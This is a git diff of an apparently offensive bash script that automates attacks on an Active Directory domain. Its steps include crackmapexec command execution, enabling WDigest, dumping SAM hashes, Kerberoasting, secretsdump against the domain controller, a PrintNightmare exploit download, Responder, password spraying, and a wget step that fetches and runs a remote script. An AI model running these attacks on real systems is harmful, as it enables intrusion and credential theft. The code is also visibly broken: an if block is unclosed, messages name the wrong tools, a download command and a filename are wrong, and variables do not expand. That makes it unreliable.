@@ -37,42 +37,69 @@ if [ $answer = y ] ; then
 	fi
 fi
 
-read -p "Do you need any of the following tools? (feroxbuster(f), impacket(i)(PrintNightmare Version), crackmapexec(c), ldapdomaindump(l) all (a), none(n)" answer
-if [ $answer = f ] ; then
-	echo -e '\E[31;40m' "Downloading feroxbuster"
-	sudo apt update
-	sudo apt install -y feroxbuster
-elif [ $answer = i ] ; then
+echo -e '\E[31;35m' "Doing an update first to make sure we can find all files"
+sudo apt update
+
+locate kerbrute_linux_amd64
+
+if [ $? -ne 0 ]; then
+	echo "Downloading Kerbrute"
+	pip3 install kerbrute
+else
+	echo "Not downloading Kerbrute"
+
+which enum4linux
+
+if [ $? -ne 0 ]; then
+	echo "Downloading enum4linux"
+	sudo apt install enum4linux
+else 
+	echo "Not downloading enum4linux"
+fi
+
+which bloodhound-python
+
+if [ $? -ne 0 ]; then
+	echo "Downloading bloodhound-python"
+	pip3 install bloodhound-python
+else 
+	echo "Not downloading feroxbuster"
+fi
+
+which terminator
+
+if [ $? -ne 0 ]; then
+	echo "Downloading terminator"
+	sudo apt install terminator
+else 
+	echo "Not downloading terminator"
+fi
+
+which crackmapexec
+
+if [ $? -ne 0 ]; then
+	echo "Downloading crackmapexec"
+	sudo apt install crackmapexec
+else 
+	echo "Not downloading crackmapexec"
+fi
+
+which ldapdomaindump
+
+if [ $? -ne 0 ]; then
+	echo "Downloading ldapdomaindump"
+	sudo apt install ldapdomaindump
+else 
+	echo "Not downloading crackmapexec"
+fi
+
+read -p "Install impacket (Print Nightmare Version by cube0x0?) (y/n):" answer
+if [ $answer = y ] ; then
 	echo -e '\E[31;40m' "Downloading impacket in home directory"
-	sudo apt update
-	cd 
 	sudo pip3 uninstall impacket
 	git clone https://github.com/cube0x0/impacket
 	cd impacket
 	sudo python3 ./setup.py install
-	sudo apt update
-elif [ $answer = c ] ; then
-	echo -e '\E[31;40m' "Downloading crackmapexec"
-	sudo apt update
-	sudo apt install crackmapexec
-	sudo apt update 
-elif [ $answer = a ] ; then
-	echo -e '\E[31;40m' "Downloading all 3"
-	sudo apt install -y feroxbuster
-	pip3 uninstall impacket
-	cd 
-	git clone https://github.com/cube0x0/impacket
-	cd impacket
-	python3 ./setup.py install
-	sudo apt install crackmapexec
-	sudo pip install ldapdomaindump
-	sudo pip install ldap3
-	sudo pip install dnspython
-	sudo apt update
-elif [ $answer = l ]; then
-	sudo pip install ldapdomaindump
-	sudo pip install ldap3
-	sudo pip install dnspython
 	sudo apt update
 elif [ $answer = n ] ; then
 	echo -e '\E[31;40m' "Not downloading anything continuing script"
@@ -93,9 +120,9 @@ read USER
 echo -e '\E[31;40m' "Password"; tput sgr0
 read PASS
 
-read -p "If you do not have a userfile already would you like to try GetADUsers.py to make a userfile? (y/n):" answer
+read -p "If you do not have a userfile already would you like to try GetADUsers.py to make a userfile (NOTE: WILL NEED A USER AND PASS FILLED OUT ABOVE)? (y/n):" answer
 if [ $answer = y ] ; then
-	GetADUsers.py -all -dc-ip $DOMAINIP > $DOMAINIP.users.txt
+	GetADUsers.py $DOMAIN/$USER:$PASS -all -ts -dc-ip $DOMAINIP > $DOMAINIP.users.txt
 	echo -e '\E[31;40m' "Saved to $DOMAINIP.users.txt"
 elif [ $answer = n ] ; then
 	echo -e '\E[31;40m' "User File if any"; tput sgr0
@@ -117,6 +144,15 @@ else
 		rm -rf $DOMAINIP.txt
 		mv $DOMAINIP.open.txt $DOMAINIP.txt
 	elif [ $answer = r ]; then
+		which rustscan
+		if [ $? -ne 0 ]; then
+			echo "Downloading rustscan v2.0.1 and doing and update"
+			https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
+			sudo dpkg -i rustscan_2.0.1_amd64.deb
+			sudo apt update
+		else 
+			echo ""
+		fi
 		echo -e '\E[31;35m' "Running RustScan on all ports"
 		rustscan -t 5000 -a $DOMAINIP --ulimit 5000 -- -Pn > $DOMAINIP.txt
 	else 
@@ -131,22 +167,23 @@ if [ $USER ] && [ $PASS ]
 then
 	read -p "Since you provided a Username and Password would you like to try some crackmapexec stuff? (y/n)" answer
 	if [ $answer = y ] ; then
+		read -p "What would you like to attack (smb, ldap, ssh, winrm, mmsql (ex: ldap) or (ex: smb)" answer
 		echo -e '\E[31;35m' "Trying Command Injection with whoami"; tput sgr0
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' -x whoami >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' -x whoami >> $DOMAINIP.txt
 		echo -e '\E[31;35m' "Trying PowerShell Injection with whoami"; tput sgr0
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' -X whoami >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' -X whoami >> $DOMAINIP.txt
 		echo -e '\E[31;35m' "Checking for logged in users" ; tput sgr0
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth >> $DOMAINIP.txt
 		echo -e '\E[31;35m' "Trying to enumerate shares" ; tput sgr0
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --shares >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --shares >> $DOMAINIP.txt
 		echo -e '\E[31;35m' "Trying to enable WDigest for LSA password dump in clear text" ; tput sgr0
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --wdigest enable >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --wdigest enable >> $DOMAINIP.txt
 		echo -e '\E[31;35m' "Checking password policy" ; tput sgr0 
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --pass-pol >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --pass-pol >> $DOMAINIP.txt
 		echo -e '\E[31;35m' "RID Brute Forcing" ; tput sgr0 
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --rid-brute >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --rid-brute >> $DOMAINIP.txt
 		echo -e '\E[31;35m' "Trying to dump local SAM hashes" ; tput sgr0 
-		crackmapexec $DOMAINIP -u '$USER' -p '$PASS' --local-auth --sam >> $DOMAINIP.txt
+		crackmapexec $answer $DOMAINIP -u '$USER' -p '$PASS' --local-auth --sam >> $DOMAINIP.txt
 	elif [ $answer = n ] ; then
 		echo -e '\E[31;35m' "Continuing Script"; tput sgr0
 	else 
@@ -178,9 +215,9 @@ then
 	echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0
 	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP >> $DOMAINIP.txt
 	GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -request >> $DOMAINIP.txt
-		echo -e '\E[31;35m' "Looking up SID"; tput sgr0
+	echo -e '\E[31;35m' "Looking up SID"; tput sgr0
 	lookupsid.py "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $DOMAINIP.txt
-		echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
+	echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0
 	secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc >> $DOMAINIP.txt
 	else
 	echo ""
@@ -416,7 +453,7 @@ then
 		read DOMDIR
 		echo -e '\E[31;35m' "Making a directory mount and trying to $DOMAINIP.mount $DOMDIR"; tput sgr0
 		mkdir $DOMAINIP.mount
-		sudo mount -t nfs $DOMAINIP:$DOMDIR $DOMAINIP.mount
+		sudo mount -t nfs //$DOMAINIP:$DOMDIR $DOMAINIP.mount
 		echo -e '\E[31;35m' "Done mounting, hopefully it worked"; tput sgr0
 	elif
 		[ $answer = n ] ; then
@@ -438,8 +475,8 @@ impacket-rpcdump @$DOMAIN | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
 sleep 2
 if grep -i "Print System Remote Protocol" $DOMAINIP.txt
 then
-	read -p "System seems vulnerable to Print Nightmare, exploit? (y/n)" answer
-	read -p "Would you like to download a PrintNightmare Script made by OvergrownCarrot1? (y/n)" answer
+	read -p "System may be vulnerable to Print Nightmare, exploit? (y/n)" answer
+	read -p "Would you like to download a PrintNightmare Script made by OvergrownCarrot1? (NOTE: THIS HAS ONLY WORKED ON A FEW MACHINES) (y/n)" answer
 	if [ $answer = y ] ; then
 		git clone https://github.com/overgrowncarrot1/PrintNightmareScript.sh.git
 		cd PrintNightmareScript
@@ -471,16 +508,6 @@ if [ $answer = y ] ; then
 	echo -e '\E[31;40m' "Location of password file ex: (/usr/share/wordlists/fasttrack.txt)"; tput sgr0
 	read PASSFILE
 	crackmapexec smb $DOMAINIP -u $USERNAME -p $PASSFILE -d $DOMAIN --continue-on-success >> $DOMAINIP.txt
-fi
-
-if [ $USER ] && [ $PASS ] && [ $DOMAIN ] && [ $DOMAINIP ]
-then
-	read -p "Would you like to try and RDP in? (y/n)"
-	if [ $answer = y ] ; then
-		xfreerdp "/u:$DOMAIN\$USER" "/p:$PASS" /v:$DOMAINIP
-	else
-		echo -e '\E[31;40m' "Not trying RDP"
-	fi
 fi
 
 if grep 5985/tcp $DOMAINIP.txt
@@ -545,32 +572,31 @@ fi
 
 read -p "Do you want to run external Bloodhound? (y/n)" answer
 if [ $answer = y ] ; then
-	read -p "Do you have bloodhound-python installed? (y/n)" answer
-	if [ $answer = y ] ; then
-		echo -e '\E[31;40m' "Username?";tput sgr0
-		read BLOODUSER
-		echo -e '\E[31;40m' "Password?"; tput sgr0
-		read BLOODPASS
-		bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
-	elif [ $answer = n ] ; then
-		echo -e '\E[31;40m' "Installing bloodhound-python"
-		pip3 install bloodhound
-		echo -e '\E[31;40m' "Username?";tput sgr0
-		read BLOODUSER
-		echo -e '\E[31;40m' "Password?"; tput sgr0
-		read BLOODPASS
-		bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
-	else
+	echo -e '\E[31;40m' "Username?";tput sgr0
+	read BLOODUSER
+	echo -e '\E[31;40m' "Password?"; tput sgr0
+	read BLOODPASS
+	bloodhound-python -u BLOODUSER -p BLOODPASS -ns $DOMAINIP -d $DOMAIN -c all
+else
 		echo "Not a valid answer"
-	fi
+fi
+
+read -p "Do you want to run SMB Killer (this is a script that makes .url, .scf, .xml, and .rtf files to upload to a share for Net-NTLM hashes (y/n):" answer
+if [ $answer = y ] ; then
+	echo -e '\E[31;40m' "Downloading newest version from github";tput sgr0
+	wget https://raw.githubusercontent.com/overgrowncarrot1/Invoke-Everything/main/SMB_Killer.sh
+	bash SMB_Killer.share
+else
+	echo -e '\E[31;40m' "Not running SMB Killer"
 fi
 
 read -p "Do you want to open a new tab for responder? (y/n)" answer
 if [ $answer = y ] ; then
 	echo -e '\E[31;40m' "Interface to run responder on ex: (eth1)?"; tput sgr0 
 	read INT
-	xterm -e "sudo responder -I $INT -rdwv;bash"
+	terminator --new-tab -e "sudo responder -I $INT -rdwv;bash"
 fi
 
 # if you actually read this, then good job, if you just ran it... shame on you, know what something is doing before you do anything, good thing
 # nothing malicious is happening to your own system!!! READ THE DAMN SCRIPTS ON GITHUB!!!
+
